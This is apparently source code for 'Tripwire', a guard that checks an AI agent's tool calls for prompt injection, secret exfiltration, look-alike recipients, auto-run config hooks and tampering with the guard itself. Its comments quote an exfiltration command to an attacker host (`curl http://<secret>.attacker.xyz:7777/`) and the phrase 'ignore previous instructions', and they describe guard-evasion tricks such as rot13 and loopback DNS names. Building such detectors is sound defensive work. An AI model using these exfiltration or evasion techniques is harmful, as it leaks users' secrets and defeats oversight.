                    out.append(Finding(rule="guard.tamper_api", severity=CRITICAL, category="scope", evidence=r.group(0)[:120],
                                       message="Hides Tripwire's own control panel or files behind rot13, an encoding "
                                               "trick, to get past the guard."))
            g = GUARD_WORDS.search(text)
            if g:
                out.append(Finding(rule="guard.tamper_api", severity=CRITICAL, category="scope", evidence=g.group(0)[:120],
                                   message="Uses Tripwire's own login key or headers, which only the guard's own tools need."))
        home = os.path.realpath(str(_guard_home()))
        for p in file_paths if cap != Capability.EXEC else []:
            full = os.path.realpath(paths.expand(p, s.cwd))
            if full == home or full.startswith(home + os.sep) or GUARD_HOME.search(p):
                out.append(Finding(rule="guard.tamper_files", severity=CRITICAL, category="scope", evidence=p[:160],
                                   message="Touches Tripwire's own files (its key, token or audit log), which agents may not do."))
                break
        return out

    def _any_daemon_port(self, text: str) -> re.Match | None:
        """The daemon's port after any host that isn't a plain public domain (an alias, a variable, $(hostname))."""
        alt = "|".join(str(p) for p in sorted(self.guard_ports))
        for m in re.finditer(rf"([^\s/:@'\"=]{{0,253}}):0{{0,4}}(?:{alt})\b", text):
            host = m.group(1).strip("[]")
            if PUBLIC_HOST.fullmatch(host) and not host.lower().endswith(("localhost", ".local", ".internal")):
                # A public-looking name can still lead here (lvh.me, 127.0.0.1.nip.io, a hosts-file entry): static
                # rules only. Any other name is judged by where it came from, like every other host.
                if not is_local_name(host):
                    continue
            return m
        return None

    def _shell_egress(self, cmd: str, s: Session, state: dict, injected: bool) -> list[Finding]:
        """Bash is the agent's main tool: a URL or host from something it read gets the same provenance checks
        in curl, wget, nc or python as in a fetch or send tool."""
        targets: list[tuple[str, bool]] = list(state.get("net", []))
        if re.search(r"urlopen|requests\.|httpx|aiohttp|\bfetch\s*\(|axios|https?\.(?:get|request)|Invoke-(?:WebRequest|RestMethod)",
                     cmd):
            posts = bool(re.search(r"data\s*=|json\s*=|\.post\s*\(|method\s*[:=]\s*['\"]?(?:post|put)|body\s*:", cmd, re.I))
            targets += [(u, posts) for u in indicators(cmd).get("url", ())]
        out: list[Finding] = []
        if s.secrets_read:
            # After reading secrets, a shell call to a host you never named is judged like a WebFetch there.
            for target, _ in targets[:20]:
                host = _url_host(target) if "://" in target else target.split("/")[0].split("@")[-1].split(":")[0]
                if not host or is_local_name(host) or " " in host or not re.search(r"[a-z]", host, re.I):
                    continue
                if s.taint.is_trusted_value(host) or s.taint.is_trusted_value(target) or _host_named_in_task(host, s) \
                        or _host_owns_read_key(host, s):
                    continue
                out.append(Finding(rule="chain.secret_then_egress", severity=HIGH, category="exfiltration",
                                   evidence=host,
                                   message=f"Sends data out to {host} after reading secrets ({_secret_names(s.secrets_read)})."))
                break
        for target, posts in targets[:20]:
            if not target or re.match(r"^(?:[a-z]+://)?(?:localhost|127\.|\[?::1)", target, re.I):
                continue
            tainted = [t for t in s.taint.tainted_values(target)]
            tmpl = s.taint.template_source(target)
            if tainted:
                v, src = max(tainted, key=lambda t: t[1].injected)
                if src.injected:
                    out.append(Finding(rule="taint.exec_target", severity=HIGH + 5, category="injection", evidence=src.snippet,
                                       message=f"Connects to '{v}' from the shell, taken from hidden instructions in {src.where}."))
                elif posts:
                    out.append(Finding(rule="taint.exec_target", severity=MEDIUM, category="exfiltration", evidence=src.snippet,
                                       message=f"Sends data from the shell to '{v}', which came from {src.where}, not from you."))
                elif injected:
                    out.append(Finding(rule="taint.exec_target", severity=MEDIUM, category="injection", evidence=src.snippet,
                                       message=f"Connects to '{v}', which came from {src.where}, after hidden instructions were found."))
            elif tmpl:
                out.append(Finding(rule="taint.url_template", severity=HIGH + 5 if tmpl[1].injected else MEDIUM,
                                   category="exfiltration", evidence=tmpl[1].snippet,
                                   message=f"Fills in a web address from {tmpl[1].where} with extra data ({tmpl[0][:80]}), "
                                           "a common way to sneak data out."))
        return out

    def _invite(self, args: dict, blob: str, s: Session, injected: bool) -> list[Finding]:
        """Attendees of an invite or share get the recipient rules of a send. When you asked for the event, an
        attendee found in your own calendar or contacts is fine; one from hidden instructions, a look-alike of
        someone you named, or someone nobody mentioned is not."""
        out: list[Finding] = []
        asked = bool(s.task and (INVITE_WORDS.search(s.task) or s.intends(Capability.SEND)))
        named = s.taint.trusted.get("email") or set()
        found = indicators("\n".join(_keyed(args, RECIPIENT_KEY))[:20_000]).get("email", set())
        for v in sorted(found):
            if s.taint.is_trusted_value(v):
                continue
            twin = _lookalike(v, named)
            src = s.taint.untrusted.get(v)
            if twin:
                out.append(Finding(rule="intent.lookalike_email", severity=HIGH, category="injection",
                                   message=f"Invites {v}, which looks like {twin} that you named but is a different address."))
            elif src and src.injected:
                out.append(Finding(rule="taint.send_target", severity=HIGH + 5, category="injection", evidence=src.snippet,
                                   message=f"Invites '{v}', taken from hidden instructions in {src.where}."))
            elif src and asked and s.taint.listed.get(v) is False:
                continue  # directory data (a contact card, an event's attendee list), not a sentence asking for it
            elif named and src:
                out.append(Finding(rule="intent.other_email", severity=MEDIUM, category="scope", evidence=src.snippet,
                                   message=f"You named {sorted(named)[0]}, but this also invites {v}, taken from {src.where}."))
            else:
                where = f", taken from {src.where}" if src else ""
                out.append(Finding(rule="intent.unnamed_email", severity=MEDIUM, category="injection" if injected else "scope",
                                   evidence=src.snippet if src else None,
                                   message=f"Invites {v}, someone you never named{where}."))
        return out

    def _recipients(self, args: dict, cap: Capability, s: Session, injected: bool) -> list[Finding]:
        """Who the message goes to. You named the people; anyone else needs a reason."""
        # Payments already always need a human (impact.money), so this is about messages.
        if cap != Capability.SEND:
            return []
        found = indicators("\n".join(_keyed(args, RECIPIENT_KEY)))
        if "iban" in found:  # long digit runs inside an IBAN are not phone numbers
            found["phone"] = {p for p in found.get("phone", ()) if not any(p in i for i in found["iban"])}
        out: list[Finding] = []
        unnamed: list[tuple[str, object]] = []
        replying = s.asked_to_reply()
        targets = s.reply_targets()
        for kind in ("email", "phone"):
            named = s.taint.trusted.get(kind)
            for v in sorted(found.get(kind, ())):
                if s.taint.is_trusted_value(v):
                    continue
                if v in targets:
                    if targets[v]:
                        out.append(Finding(rule="intent.reply_target_injected", severity=MEDIUM, category="injection",
                                           message=f"Replies to {v}, as you asked, but that email had hidden "
                                                   "instructions in it, so check what the reply says."))
                    continue  # you asked to reply to this person, and this is the address their email came from
                twin = _lookalike(v, (named or set()) | set(targets)) if kind == "email" else None
                if twin:
                    who = "you asked to reply to" if twin in targets else "that you named"
                    out.append(Finding(rule="intent.lookalike_email", severity=HIGH, category="injection",
                                       message=f"Sends to {v}, which looks like {twin} {who} but is a different "
                                               "address (a classic look-alike trick)."))
                    continue
                src = s.taint.untrusted.get(v)
                if src and src.injected:
                    continue  # already reported as an attacker value
                if v in s.taint.reply_to and v not in s.taint.senders:
                    # Reply-To is chosen by whoever wrote the email: replying "to Sam" must go to Sam, not to it.
                    out.append(Finding(rule="intent.reply_to_elsewhere", severity=MEDIUM, category="scope",
                                       evidence=src.snippet if src else None,
                                       message=f"Sends to {v}, the Reply-To address on an email, not the person who "
                                               "wrote it. Phishing emails use this trick."))
                    continue
                if replying and v in s.taint.senders and not s.taint.senders[v]:
                    continue  # you asked to reply, and this person wrote one of the messages
                if not named and s.intends(cap) and s.taint.listed.get(v) is False:
                    continue  # you asked to send, and this address is directory data (a contact field, a list), not prose
                if named and src:
                    out.append(Finding(rule=f"intent.other_{kind}", severity=HIGH + 5, category="injection", evidence=src.snippet,
                                       message=f"You named {sorted(named)[0]}, but this goes to {v}, taken from {src.where}."))
                elif named:
                    out.append(Finding(rule=f"intent.other_{kind}", severity=MEDIUM, category="scope",
                                       message=f"You named {sorted(named)[0]}, but this also goes to {v}, which you never mentioned."))
                elif injected and v in s.taint.unverified:
                    out.append(Finding(rule=f"intent.unverified_{kind}", severity=MEDIUM, category="injection",
                                       message=f"Goes to {v}. You named it, but only after hidden instructions were found, "
                                               "so Tripwire can't vouch for it on its own."))
                elif injected and not src:
                    out.append(Finding(rule=f"intent.unknown_{kind}", severity=MEDIUM, category="injection",
                                       message=f"Goes to {v}, which neither you nor anything the agent read mentioned, "
                                               "after hidden instructions were found."))
                else:
                    # A new person you never named. Fine to ask; not fine to do silently (a polite email with no
                    # "ignore previous instructions" can still ask the agent to mail data to a stranger).
                    unnamed.append((v, src))
        if unnamed:
            # One finding naming every such address, the ones taken from content first: the reason must name the
            # actual stranger (review 4: [alice@corp.com, x@evil.xyz] was reported as "sends to alice@corp.com").
            unnamed.sort(key=lambda x: (x[1] is None, x[0]))
            v, src = unnamed[0]
            who = ", ".join(x[0] for x in unnamed[:3]) + (f" and {len(unnamed) - 3} more" if len(unnamed) > 3 else "")
            where = f", taken from {src.where}" if src else ""
            out.append(Finding(rule="intent.unnamed_email" if "@" in v else "intent.unnamed_phone", severity=MEDIUM,
                               category="scope", evidence=src.snippet if src else None,
                               message=f"Sends to {who}, " + ("someone" if len(unnamed) == 1 else "people")
                                       + f" you never named{where}."))
        # Chat handles and channels (@mallory-ext, #ops): the same rule, with names instead of addresses.
        named_handles = {x.lstrip("@#") for x in re.findall(r"(?<![\w@.])[@#][\w.-]{2,80}", s.taint.trusted_text)}
        for raw in _keyed(args, RECIPIENT_KEY):
            for h in _handles(raw):
                bare = h.lstrip("@#")
                if s.taint.is_trusted_value(h) or s.taint.is_trusted_value(bare):
                    continue
                twin = _lookalike(bare, named_handles)
                if twin and len(bare) >= 4:
                    out.append(Finding(rule="intent.lookalike_handle", severity=HIGH, category="injection",
                                       message=f"Messages {h}, which looks like {twin} that you named but is a different name."))
                    break
                if s.intends(cap) and False in (s.taint.listed.get(h), s.taint.listed.get(bare)) and \
                        True not in (s.taint.listed.get(h), s.taint.listed.get(bare)):
                    continue  # a channel or user from a clean listing (get_channels, a message's sender field)
                src = s.taint.untrusted.get(h) or s.taint.untrusted.get(bare) or _mentioned(s, h)
                if src and src.injected:
                    sev, cat = HIGH + 5, "injection"
                    msg = f"Messages {h}, a name taken from hidden instructions in {src.where}."
                else:
                    sev, cat = MEDIUM, "scope"
                    msg = f"Messages {h}, someone you never named" + (f", mentioned in {src.where}." if src else ".")
                out.append(Finding(rule="intent.unnamed_handle", severity=sev, category=cat, message=msg,
                                   evidence=src.snippet if src else None))
                break
        return out

    # ---- events -------------------------------------------------------------
    def _emit(self, kind: str, data: dict) -> None:
        for fn in list(self.listeners):
            try:
                fn(kind, data)
            except Exception:
                pass


ROUTINE = re.compile(
    r"^\s*(npm|pnpm|yarn|bun)\s+(test|run (test|lint|build|dev|typecheck)|install|ci)\b|^\s*(pytest|tox|make|cargo (test|build|check)|"
    r"go (test|build|vet)|python -m (pytest|unittest)|uv (run pytest|sync)|git (status|diff|log|show)|ls|pwd|tsc|eslint|ruff)\b")


HANDLE = re.compile(r"^[@#]?[a-z0-9][\w.\-]{0,79}$", re.I)


def _handles(raw: str) -> list[str]:
    """Chat-style recipients in a recipient field: '@mallory-ext', '#eng', 'general', 'alice'.
    Emails and phone numbers are handled separately."""
    out = []
    for part in re.split(r"[,;\s]+", raw.strip()[:2000])[:50]:
        p = part.strip().lower()
        if not p or "@" in p[1:] or re.fullmatch(r"\+?[\d\- ()]{7,}", p) or not HANDLE.match(p):
            continue
        out.append(p)
    return out


def _mentioned(s: Session, h: str):
    """Where an untrusted output mentioned this handle, if anywhere (handles are not indicators)."""
    needle = h.lstrip("@#")
    if len(needle) < 3:
        return None
    pat = re.compile(rf"(?<![\w-]){re.escape(needle)}(?![\w-])", re.I)
    for line, src in reversed(s.taint.untrusted_lines[-2000:]):
        if needle in line and pat.search(line):
            return src
    return None


# Public DNS names that always lead back to this computer (wildcard loopback services), and local-only suffixes.
# The guard never looks a name up itself: a live lookup of an agent-chosen name is itself a way to leak data
# (review 4: `curl http://<secret>.attacker.xyz:7777/` made the guard send the secret to the attacker's DNS).
LOOPBACK_DNS = re.compile(
    r"(?:^|\.)(?:lvh\.me|localtest\.me|vcap\.me|lacolhost\.com|fuf\.me|localho\.st|local\.gd|yoogle\.com|"
    r"ulh\.me|smackaho\.st|readme\.localhost|localhost|local|internal)$|"
    # nip.io-style services: any name that carries a loopback or unspecified address, in dots, dashes or hex.
    r"(?:^|[.-])(?:127|0)[.-]\d{1,3}[.-]\d{1,3}[.-]\d{1,3}\.(?:nip\.io|sslip\.io|xip\.io|traefik\.me|nip\.direct|"
    r"local\.gd|localtest\.me|lvh\.me)$|"
    r"(?:^|[.-])(?:7f[0-9a-f]{6}|0{8})\.(?:nip\.io|sslip\.io|xip\.io|traefik\.me)$|"
    r"(?:^|[.-])(?:--1|0--1|[0:-]{2,16}1)\.(?:sslip\.io|nip\.io)$",
    re.I)
_HOSTS_FILE = "/etc/hosts"
_HOSTS: tuple[float, set[str]] = (0.0, set())


def _hosts_file_local() -> set[str]:
    """Names this machine's hosts file points at a loopback address (a local file, never the network)."""
    global _HOSTS
    try:
        mtime = os.stat(_HOSTS_FILE).st_mtime
    except OSError:
        return set()
    if _HOSTS[0] == mtime:
        return _HOSTS[1]
    names: set[str] = set()
    try:
        with open(_HOSTS_FILE, encoding="utf-8", errors="replace") as fh:
            for line in fh.read(1_000_000).splitlines()[:20_000]:
                parts = line.split("#", 1)[0].split()
                if len(parts) >= 2 and _addr_is_local(parts[0]):
                    names.update(p.lower().rstrip(".") for p in parts[1:])
    except OSError:
        return set()
    _HOSTS = (mtime, names)
    return names


def _addr_is_local(addr: str) -> bool:
    import ipaddress
    try:
        ip = ipaddress.ip_address(addr.split("%", 1)[0])
    except ValueError:
        return False
    if getattr(ip, "ipv4_mapped", None):
        ip = ip.ipv4_mapped
    return ip.is_loopback or ip.is_link_local or ip.is_unspecified


def is_local_name(host: str) -> bool:
    """Does `host` lead to this computer? Decided by static rules only: IP literals in any notation (dotted, one
    number, hex, octal, IPv6, IPv4-mapped), localhost and *.localhost, local-only suffixes, wildcard loopback DNS
    services (lvh.me, nip.io, sslip.io ...) and the hosts file. Never a DNS lookup."""
    from .taint import _ip_from_parts
    h = host.strip().strip("[]").rstrip(".").lower()
    if not h:
        return False
    if LOOPBACK_DNS.search(h) or re.fullmatch(LOCAL_ADDR, h, re.I) or _addr_is_local(h):
        return True
    if re.fullmatch(r"(?:0x[0-9a-f]{1,8}|\d{1,10})(?:\.(?:0x[0-9a-f]{1,8}|\d{1,10})){0,3}", h):
        return _addr_is_local(_ip_from_parts(h))
    return h in _hosts_file_local()


def _resolver_tricks(text: str, ports: set[int]) -> str | None:
    """--resolve / --connect-to pointing a name at this computer or at the daemon's port, a Host header naming
    localhost, or any URL whose host resolves here with a port worked out at run time."""
    alt = "|".join(str(p) for p in sorted(ports))
    for m in re.finditer(r"--(?:resolve|connect-to)[=\s]{1,4}['\"]?([^\s'\"]{1,300})", text):
        spec = m.group(1)
        if re.search(LOCAL_ADDR, spec, re.I) or re.search(rf"(?:^|:)(?:{alt})(?::|$)", spec) or \
                any(is_local_name(x) for x in spec.split(":") if PUBLIC_HOST.fullmatch(x or "")):
            return m.group(0)
    m = re.search(rf"\bHost\s{{0,3}}[:=]\s{{0,3}}['\"]?{LOCAL_ADDR}", text, re.I)
    if m and re.search(r"(?:-H|--header|headers?)\b", text, re.I):
        return m.group(0)
    for m in re.finditer(r"(?:https?|wss?)://([a-z0-9.-]{1,253})(?::\s{0,3}[\"']?\s{0,2}(?:[$`{%(]|\+))", text, re.I):
        if PUBLIC_HOST.fullmatch(m.group(1)) and is_local_name(m.group(1)):
            return m.group(0)
    return None


SECRET_KIND_NAMES = {"private_key": "a private key", "aws_key": "an AWS key", "github_token": "a GitHub token",
                     "anthropic_key": "an Anthropic key", "openai_key": "an OpenAI key", "slack_token": "a Slack token",
                     "google_key": "a Google key", "stripe_key": "a Stripe key", "jwt": "a login token",
                     "env_assignment": "a password line"}


def _secret_kinds(kinds: list[str]) -> str:
    names = list(dict.fromkeys(SECRET_KIND_NAMES.get(k, k.replace("_", " ")) for k in kinds))
    return " and ".join([", ".join(names[:-1]), names[-1]] if len(names) > 1 else names)


def _secret_names(read: list[str]) -> str:
    """The last two secrets read, once each: ".env" and ".env (openai key)" are the same file."""
    out: dict[str, str] = {}
    for r in read:
        base = r.split(" (", 1)[0]
        if base not in out or len(r) > len(out[base]):
            out.pop(base, None)
            out[base] = r
    names = list(out.values())[-2:]
    return ", ".join(re.sub(r"\(([a-z_ ]{1,40})\)", lambda m: "(" + SECRET_KIND_NAMES.get(m.group(1).replace(" ", "_"),
                                                                                       m.group(1)) + ")", n) for n in names)


def _as_written(v: str, blob: str) -> str:
    i = blob.lower().find(v.lower())
    return blob[i:i + len(v)] if i >= 0 else v


def _only_named_recipients(args: dict, s: Session) -> bool:
    rec = _keyed(args, RECIPIENT_KEY)
    found = indicators("\n".join(rec)[:20_000])
    people = sorted(found.get("email", set()) | found.get("phone", set()))
    targets = s.reply_targets()
    return bool(people) and all(s.taint.is_trusted_value(p) or targets.get(p) is False for p in people)


def _carries_secret(blob: str, s: Session) -> bool:
    if find_secrets(blob) or any(v in blob for v in s.secret_values if len(v) >= 8):
        return True
    if any(find_secrets(d) or any(_shares_secret(d, v) for v in s.secret_values) for _, d in _decoded_tokens(blob)):
        return True
    return bool(s.secret_values) and _has_gram(blob, _secret_grams(s))


def _guard_home():
    from pathlib import Path
    return Path(os.environ.get("TRIPWIRE_HOME") or Path.home() / ".tripwire")


def _taint_target(cap: Capability, v: str, src, s: Session, args: dict, injected: bool) -> tuple[int, str]:
    """How bad it is that an outgoing action uses `v`, a value that came from content the agent read."""
    verb = _TARGET_VERB.get(cap, "Uses")
    if src.injected:
        # The value sat next to hidden instructions: it is attacker-chosen.
        return (CRITICAL if cap == Capability.MONEY else HIGH + 5), f"{verb} '{v}', taken from hidden instructions in {src.where}."
    if cap == Capability.WRITE:
        return 0, ""
    if cap == Capability.AGENT:
        # Handing a sub-agent an address or link from something it read: the child may act on it unseen.
        return MEDIUM, f"Hands a sub-agent '{v}', which came from {src.where}, not from you."
    if cap == Capability.FETCH:
        return (MEDIUM if injected else LOW), f"Visits '{v}', which came from content the agent read ({src.where}), not from you."
    if cap == Capability.SEND and any(v.lower() in d.lower() for d in _keyed(args, DEST_URL_KEY)):
        # Asking to send something (to Sam) does not make a web address from an email or page a place to
        # upload to: "post the notes to https://..." in a polite email has no injection phrase at all.
        return MEDIUM, f"Uploads to '{v}', a web address you never named, taken from {src.where}."
    if s.intends(cap):
        # User asked for this kind of action and the value came from a clean document they pointed at.
        return (MEDIUM if cap == Capability.MONEY else LOW), f"Uses '{v}' from {src.where}. You asked for this, but check the details."
    return (CRITICAL if cap == Capability.MONEY else HIGH + 5), f"{verb} '{v}', which came from {src.where}, not from you."



def _host_named_in_task(host: str, s: Session) -> bool:
    """The host's own name ("github" for api.github.com) is a word in your task: "check whether the GitHub API is up"."""
    labels = host.lower().split(".")
    reg = labels[-2] if len(labels) >= 2 else labels[0]
    return len(reg) >= 3 and bool(re.search(rf"(?<![\w-]){re.escape(reg)}(?![\w-])", s.task or "", re.I))


def _host_owns_read_key(host: str, s: Session) -> bool:
    """A key that was read goes back to its own service (an OpenAI key read from .env, sent to api.openai.com)."""
    from .analyzers.shell import KEY_HOMES
    h = host.lower()
    read = " ".join(s.secrets_read).lower()
    kinds = {"openai key": "openai", "anthropic key": "anthropic", "github token": "github", "stripe key": "stripe",
             "slack token": "slack", "aws key": "aws", "google key": "google"}
    owners = [w for k, w in kinds.items() if k in read or k.replace(" ", "_") in read]
    return any(h == d or h.endswith("." + d) for w in owners for d in KEY_HOMES.get(w, ()))


def _is_routine(cmd: str) -> bool:
    return bool(ROUTINE.match(cmd)) and not re.search(r"[|;&`$><]", cmd)


def _verb(cap: Capability) -> str:
    return {Capability.SEND: "send messages", Capability.MONEY: "move money", Capability.DELETE: "delete anything",
            Capability.EXEC: "run commands", Capability.WRITE: "change files", Capability.READ: "read files",
            Capability.FETCH: "fetch outside content", Capability.AGENT: "start other agents",
            Capability.CREDENTIAL: "change passwords or keys"}.get(cap, "use this tool")


def _redact_value(v: Any, depth: int = 0) -> Any:
    if depth > MAX_NEST:
        return "…[too deep]"
    if isinstance(v, str):
        return redact(v)
    if isinstance(v, dict):
        return {str(k): _redact_value(x, depth + 1) for k, x in v.items()}
    if isinstance(v, (list, tuple)):
        return [_redact_value(x, depth + 1) for x in v]
    return v


def _redacted(a: Action) -> Action:
    # Redact each string on its own: redacting the JSON text could swallow a closing quote and crash.
    return a.model_copy(update={"args": _redact_value(a.args)})


CONTENT_KEY = re.compile(r"^(content|contents|new_string|new_source|text|code|source_code|body|data|edits|new_str|file_text|insert_text)$")
CODE_RUNNERS = {".py": "python", ".pyw": "python", ".js": "node", ".mjs": "node", ".cjs": "node", ".ts": "node",
                ".rb": "ruby", ".pl": "perl", ".php": "php", ".ps1": "pwsh"}
SHELL_EXT = (".sh", ".bash", ".zsh", ".command", ".envrc")
RUN_LINE = re.compile(r"^\s{0,40}-?\s{0,4}run:\s{0,4}\|?\s{0,4}(.{1,2000})$", re.M)


MAKE_SYNTAX = re.compile(r"^\s{0,8}(?:[\w.-]{1,80}\s{0,4}[:+?!]?=|[\w./%$(){} -]{1,200}:(?!=)|-?include\b|#|\.PHONY|"
                         r"if(?:n?eq|n?def)\b|endif\b|else\b|define\b|endef\b|export\b|unexport\b|override\b|vpath\b|$)")
# Settings files that make an editor, git or a dev container run commands by themselves.
DEVCONTAINER_KEYS = re.compile(r'"(initializeCommand|onCreateCommand|updateContentCommand|postCreateCommand|postStartCommand|'
                               r'postAttachCommand)"\s{0,4}:\s{0,4}("(?:[^"\\\n]|\\.){0,2000}"|\[[^\]]{0,2000}\]|\{[^}]{0,4000}\})')
GIT_CONFIG_EXEC = re.compile(r"^\s{0,8}(?:\w{1,40}\s{0,4}=\s{0,4}!|(?:sshCommand|hooksPath|fsmonitor|pager|editor|askPass|"
                             r"gpgProgram|program|textconv|clean|smudge|process|command|helper|external|cmd|proxyCommand|gitProxy)"
                             r"\s{0,4}=)", re.I | re.M)


def _file_scripts(path: str, content: str, runner: str | None = None) -> tuple[list, bool, str | None]:
    """(shell scripts or ("code", runner, text) tuples to judge, is a source file, persistence reason or None).
    runner: the file is being fed to this interpreter right now (`python3 < f`, `cat f | sh`), whatever its name."""
    low = path.lower().replace("\\", "/")
    base = low.rsplit("/", 1)[-1]
    scripts: list = []
    code_file = False
    why = None
    if runner:
        if runner in ("sh", "bash", "zsh", "dash", "ksh"):
            return [content], False, None
        return [("code", runner, content)], True, None
    if base.endswith(".pth"):
        # Python runs every line of a .pth file that starts with "import", on every start, in every project.
        lines = "\n".join(ln for ln in content.splitlines() if re.match(r"\s{0,8}import[\s\t]", ln))
        if lines:
            return [("code", "python", lines)], True, "Python runs its import lines by itself every time it starts"
        return [], False, None
    if base in ("sitecustomize.py", "usercustomize.py"):
        return [("code", "python", content)], True, "Python runs it by itself every time it starts"
    if low.endswith((".patch", ".diff")) or re.match(r"(?:diff --git |--- \S{1,300}\n\+\+\+ )", content):
        # A patch is the files it will create once applied: judge each one's added lines as that file.
        for target, added in _patch_files(content):
            sc, _cf, w = _file_scripts(target, added)
            scripts += sc
            why = why or w
        return [x for x in scripts if x], True, why
    if low.endswith(SHELL_EXT) or re.match(r"#!\s{0,4}\S{0,40}\b(ba|z|da|k)?sh\b", content):
        scripts.append(content)
    elif base in ("makefile", "gnumakefile", "justfile") or base.startswith(("makefile.", "gnumakefile.")) or low.endswith(".mk"):
        lines = content.splitlines()
        scripts.append("\n".join(ln.strip().lstrip("@-") for ln in lines if ln.startswith("\t")))
        # A fragment that is not make syntax (a bare command line) still means someone wants it run.
        scripts.append("\n".join(ln for ln in lines if not ln.startswith("\t") and not MAKE_SYNTAX.match(ln)))
        scripts += re.findall(r"\$\(shell\s([^)\n]{1,2000})\)", content)
    elif base == "package.json":
        try:
            pkg = json.loads(content)
            scripts += [v for v in (pkg.get("scripts") or {}).values() if isinstance(v, str)]
            hooks = [k for k in (pkg.get("scripts") or {}) if str(k) in LIFECYCLE]
            if hooks:
                why = f"its '{hooks[0]}' script runs by itself on every npm install"
        except (ValueError, AttributeError):
            scripts += re.findall(r'"(?:pre|post)?\w{1,40}"\s{0,4}:\s{0,4}"([^"\n]{1,2000})"', content)
    elif "/.github/workflows/" in low or low.startswith(".github/workflows/") or base in (".gitlab-ci.yml",):
        scripts += [m.group(1) for m in RUN_LINE.finditer(content)]
    elif low.endswith("/.git/config") or low == ".git/config" or base == ".gitconfig":
        for m in GIT_CONFIG_EXEC.finditer(content):
            line = content[m.start():content.find("\n", m.start()) if "\n" in content[m.start():] else len(content)]
            scripts.append(line.split("=", 1)[1].strip().lstrip("!"))
            why = why or "git runs the command in it by itself (an alias, hook folder, ssh or filter command)"
    elif "/.vscode/" in "/" + low and base in ("tasks.json", "settings.json", "launch.json") or "/.devcontainer/" in "/" + low \
            or base in (".devcontainer.json",):
        scripts += [json.loads(v) if v.startswith('"') else v for _, v in DEVCONTAINER_KEYS.findall(content)
                    if _json_ok(v)]
        scripts += re.findall(r'"command"\s{0,4}:\s{0,4}"((?:[^"\\\n]|\\.){1,2000})"', content)
        if re.search(r'"runOn"\s{0,4}:\s{0,4}"folderOpen"', content):
            why = "the editor runs its task by itself as soon as the folder is opened"
        elif DEVCONTAINER_KEYS.search(content):
            why = "the dev container runs its commands by itself when it starts"
    elif base == "pyproject.toml":
        if re.search(r"^\s{0,4}\[tool\.hatch\.build(?:\.targets\.\w{1,40})?\.hooks\.|^\s{0,4}backend-path\s{0,4}=", content, re.M):
            why = "it adds a build hook that runs code from the project on every install"
    else:
        ext = "." + base.rsplit(".", 1)[-1] if "." in base else ""
        run = CODE_RUNNERS.get(ext)
        if run:
            code_file = True
            scripts.append(("code", run, content))
        else:
            # A "data" file (.txt, .json, .md, no extension) that is really code: `python3 < data.txt` runs it.
            guess = _looks_like_code(content)
            if guess:
                code_file = True
                scripts.append(content if guess == "sh" else ("code", guess, content))
    return [x for x in scripts if x], code_file, why


def _patch_files(diff: str) -> list[tuple[str, str]]:
    """(file, added text) for each file a unified diff creates or changes."""
    out: list[tuple[str, list[str]]] = []
    for line in diff[:MAX_ARGS_CHARS].splitlines()[:20_000]:
        m = re.match(r"\+\+\+ (?:[ab]/)?(\S{1,500})", line)
        if m:
            out.append((m.group(1), []))
        elif out and line.startswith("+"):
            out[-1][1].append(line[1:])
    return [(f, "\n".join(lines)) for f, lines in out[:50] if f != "/dev/null" and lines]


_SHELL_START = re.compile(r"^\s{0,8}(?:curl|wget|bash|sh|zsh|python3?|node|perl|ruby|nc|ncat|scp|rsync|ssh|cat|cp|mv|rm|"
                          r"chmod|chown|export|echo|printf|eval|source|exec|base64|openssl|git|npm|npx|pip3?|uv|tar|"
                          r"zip|crontab|launchctl|sudo|cd|mkdir|tee|sed|awk|xargs|find|env|set|if|for|while)\b")


def _looks_like_code(content: str) -> str | None:
    """python / node / sh when a file without a code extension is really a program; None for prose and data."""
    import ast
    import warnings
    text = content[:MAX_DISK_READ]
    if not text.strip() or len(text) < 12:
        return None
    try:
        with warnings.catch_warnings():
            warnings.simplefilter("ignore")
            tree = ast.parse(text)
        if any(isinstance(n, (ast.Import, ast.ImportFrom, ast.Call)) for n in ast.walk(tree)):
            return "python"
    except (SyntaxError, ValueError, RecursionError, MemoryError):
        pass
    if re.search(r"\brequire\s{0,4}\(\s{0,4}['\"]|^\s{0,8}import\s.{1,200}\sfrom\s['\"]|\bprocess\.(?:env|argv)|"
                 r"\bfetch\s{0,4}\(|child_process", text, re.M) and re.search(r"[;{}()]", text):
        return "node"
    lines = [ln for ln in text.splitlines()[:400] if ln.strip() and not ln.lstrip().startswith("#")]
    if lines and sum(bool(_SHELL_START.match(ln)) for ln in lines) * 2 > len(lines):
        return "sh"
    return None


def _json_ok(v: str) -> bool:
    try:
        json.loads(v)
        return True
    except ValueError:
        return False


LIFECYCLE = {"preinstall", "install", "postinstall", "prepare", "preprepare", "postprepare", "prepublish", "prepack",
             "postpack", "dependencies"}


def _written_code_findings(path: str, args: dict, s: Session, injected: bool, state: dict | None = None,
                           run: str | None = None, runner: str | None = None) -> list[Finding]:
    """A file the agent writes may run later (`make test`, `npm test`, `python x.py`, CI), out of sight of the
    shell check. So check what the file would do now, the same way a command typed in the shell is checked.
    run="agent"|"disk": the file is being run right now (read from disk); agent-written files count in full."""
    content = "\n".join(_keyed(args, CONTENT_KEY))[:MAX_ARGS_CHARS // 4]
    if not content.strip():
        return []
    scripts, code_file, why = _file_scripts(path, content, runner)
    name = path.rsplit("/", 1)[-1]
    out: list[Finding] = []
    if why and not run:
        out.append(Finding(rule="write.autorun_config", severity=HIGH + 5 if injected else MEDIUM + 5, category="persistence",
                           message=f"Changes {name}, and {why}."))
    floor = MEDIUM if injected else HIGH  # without hidden instructions around, only clearly dangerous code counts
    full_strength = injected or run == "agent"
    for script in scripts:
        found = analyze_code(script[1], script[2], s) if isinstance(script, tuple) else analyze_shell(script, s)
        for x in found:
            if x.rule == "shell.pipe_to_shell" and code_file:
                continue  # `python -c` that fetches reads as "download and run"; a source file that calls an API is not that
            guard = x.rule.startswith("shell.guard")
            if x.severity >= HIGH and state is not None and not run:
                # Remember it at full strength: running this file later is running this code.
                full = os.path.normpath(paths.expand(path, s.cwd))
                old = state.setdefault("risky_written", {}).get(full)
                if not old or old[0] < x.severity:
                    state["risky_written"][full] = (x.severity, x.category, f"{x.message[0].lower()}{x.message[1:]}")
            if x.severity >= floor and x.category != "obfuscation" or x.severity >= HIGH:
                sev = x.severity if full_strength or guard else min(x.severity, MEDIUM + 5)
                if run:
                    msg = f"Runs {name}, which would {x.message[0].lower()}{x.message[1:]}"
                else:
                    msg = f"The file it writes ({name}) would run later and {x.message[0].lower()}{x.message[1:]}"
                out.append(Finding(rule="exec.runs_file" if run else "write.risky_code", category=x.category,
